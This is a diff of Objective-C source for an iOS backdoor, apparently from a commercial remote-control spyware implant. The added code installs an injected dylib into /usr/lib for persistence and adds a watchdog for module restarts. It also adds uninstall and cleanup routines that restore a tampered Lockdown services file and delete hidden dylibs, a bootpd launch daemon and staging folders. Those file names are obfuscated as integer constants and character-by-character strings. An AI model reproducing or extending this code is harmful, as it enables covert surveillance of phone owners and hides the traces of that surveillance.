@@ -31,6 +31,8 @@
 
 #import "RCSIGlobals.h"
 
+#define RESTART_TIMEOUT 60.00
+
 //#define DEBUG_
 //#define __DEBUG_IOS_DYLIB
 
@@ -166,6 +168,10 @@ static NSMutableArray *gCurrProcsList = nil;
 
 @implementation _i_Core (hidden)
 
+#pragma mark -
+#pragma mark Persistent routine
+#pragma mark -
+
 - (void)launchCtl:(char*)aDaemon command:(char*)aCommand
 {
   char statment[256];
@@ -265,8 +271,35 @@ static NSMutableArray *gCurrProcsList = nil;
   return TRUE;
 }
 
+- (BOOL)createExternalLib
+{
+  NSString *dylibPathname =
+  [[NSString alloc] initWithFormat:@"%@/%@",
+                                   @"/usr/lib",
+                                   gDylibName];
+  NSString *local_dylibName =
+  [[NSString alloc] initWithFormat:@"%@/%@",
+                                   [[NSBundle mainBundle] bundlePath],
+                                   gDylibName];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath:dylibPathname] == FALSE)
+  {
+    if ([[NSFileManager defaultManager] copyItemAtPath:local_dylibName
+                                                toPath:dylibPathname
+                                                 error:nil] == FALSE);
+    return FALSE;
+  }
+  
+  return TRUE;
+}
+
 - (BOOL)isBackdoorAlreadyResident
 {
+  if ([self createExternalLib] == FALSE)
+  {
+    createInfoLog(@"Cannot install external module");
+  }
+  
   if ([[NSFileManager defaultManager] fileExistsAtPath:BACKDOOR_DAEMON_PLIST
                                            isDirectory:NULL])
     return YES;
@@ -289,6 +322,10 @@ static NSMutableArray *gCurrProcsList = nil;
   return TRUE;
 }
 
+#pragma mark -
+#pragma mark Uninstall
+#pragma mark -
+
 - (BOOL)uninstallExternalModules
 {  
   NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
@@ -308,10 +345,36 @@ static NSMutableArray *gCurrProcsList = nil;
 
 - (void)uninstallMeh
 {
+  int kpfdylib   = 0x0066706b;
+  int kpbdylib   = 0x0062706b;
+  NSString *boot = @"bootpd";
+  NSString *comp = @"com.apple";
+  
+  NSString *kpfname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpfdylib];
+  NSString *kpbname    = [NSString stringWithFormat:@"/usr/lib/%s.dylib", (char*)&kpbdylib];
+  NSString *bootplist  = [NSString stringWithFormat:@"/System/Library/LaunchDaemons/%@.%@.plist",
+                                                   comp, boot];
+  
+  NSString *lockdown_saved  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.bck"];
+  NSString *lockdown_plist  = [NSString stringWithFormat:@"/System/Library/Lockdown/Services.plist"];
+  
+  if ([[NSFileManager defaultManager] fileExistsAtPath:lockdown_saved])
+  {
+    [[NSFileManager defaultManager] removeItemAtPath:lockdown_plist error:nil];
+    
+    [[NSFileManager defaultManager] copyItemAtPath:lockdown_saved
+                                            toPath:lockdown_plist
+                                             error:nil];
+  }
+  
+  [[NSFileManager defaultManager] removeItemAtPath:kpfname    error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:kpbname    error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:bootplist  error:nil];
+  
   NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
   NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
   NSString *dylibPathname = 
-  [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
+          [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
   
   [self uninstallExternalModules];
   
@@ -320,7 +383,7 @@ static NSMutableArray *gCurrProcsList = nil;
   
   [self launchCtl: ITUNESSTORE_PLIST_PATH command: "unload"];
   [self launchCtl: ITUNESSTORE_PLIST_PATH command: "load"];
-  
+    
   [[NSFileManager defaultManager] removeItemAtPath: dylibPathname
                                              error: nil];
   [[NSFileManager defaultManager] removeItemAtPath: [[NSBundle mainBundle] bundlePath]
@@ -395,6 +458,10 @@ static NSMutableArray *gCurrProcsList = nil;
   
   return TRUE;
 }
+
+#pragma mark -
+#pragma mark Startup support routine
+#pragma mark -
 
 - (BOOL)amIAlone
 {
@@ -518,6 +585,24 @@ typedef struct _coreMessage_t
   [msgData release];
 }
 
+/*
+ * Check if backdoor is blocked on restarting mouduels
+ */
+- (void)checkWDTimeout:(NSTimer*)theTimer
+{
+  if (mIsRestarting == TRUE)
+  {
+    /*
+     * timeout reached: exit immediatly and unclean
+     */
+    createInfoLog(@"Reload timeout reached");
+    
+    sleep(1);
+    
+    exit(-1);
+  }
+}
+
 - (void)manageCoreNotification:(uint)aFlag
                    withMessage:(NSData*)aMessage
 {
@@ -531,6 +616,17 @@ typedef struct _coreMessage_t
       [self updateDylibConfigId];
     
       [self setStatus: CORE_STATUS_RELOAD];
+      
+      /*
+       * Start the watchdog: max RESTART_TIMEOUT
+       */
+      mIsRestarting = TRUE;
+      
+      [NSTimer scheduledTimerWithTimeInterval:RESTART_TIMEOUT
+                                       target:self
+                                     selector:@selector(checkWDTimeout:)
+                                     userInfo:nil
+                                      repeats:NO];
     }
   else if (aFlag == CORE_ACTION_STOPPED)
     {
@@ -538,11 +634,11 @@ typedef struct _coreMessage_t
     }
   else if (aFlag == CORE_EVENT_STOPPED)
     {
-      [self resetStatus:  CORE_STATUS_EM_RUN];
+      [self resetStatus: CORE_STATUS_EM_RUN];
     }
   else if (aFlag == CORE_AGENT_STOPPED)
     {
-      [self resetStatus:  CORE_STATUS_MM_RUN];
+      [self resetStatus: CORE_STATUS_MM_RUN];
     }
   else if (aFlag == ACTION_DO_UNINSTALL)
     {
@@ -883,6 +979,8 @@ typedef struct _coreMessage_t
               [self startActionManager] == TRUE && 
               [self startEventManager]  == TRUE)
             {
+              // reset flag checked by watchdog timer
+              mIsRestarting = FALSE;
               [self resetStatus: CORE_STATUS_RELOAD];
             }
           else
@@ -928,7 +1026,8 @@ typedef struct _coreMessage_t
       agentManager          = nil;
       mLockSock             = -1;
       mSBPid                = -1;
-    
+      mIsRestarting         = FALSE;
+      
       [self _guessNames];
     }
   
@@ -943,8 +1042,18 @@ typedef struct _coreMessage_t
 - (void)cleanUp:(NSTimer*)theTimer
 {
   int zeroChar = 0;
+  
+  NSString *kdifolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
+                              'k', 'd', 'i'];
+  NSString *iosfolder = [NSString stringWithFormat:@"/var/mobile/Media/%c%c%c",
+                              'i', 'o', 's'];
+  
+  [[NSFileManager defaultManager] removeItemAtPath:kdifolder error:nil];
+  [[NSFileManager defaultManager] removeItemAtPath:iosfolder error:nil];
+  
   NSString *installDirName = [NSString stringWithFormat:@"../.%d%d%d%d",
                                                         zeroChar, zeroChar, zeroChar, zeroChar];
+  
   NSString *installLaunchName = [NSString stringWithUTF8String: LAUNCHD_INSTALL_PLIST];
   
   [[NSFileManager defaultManager] removeItemAtPath:installDirName error:nil];
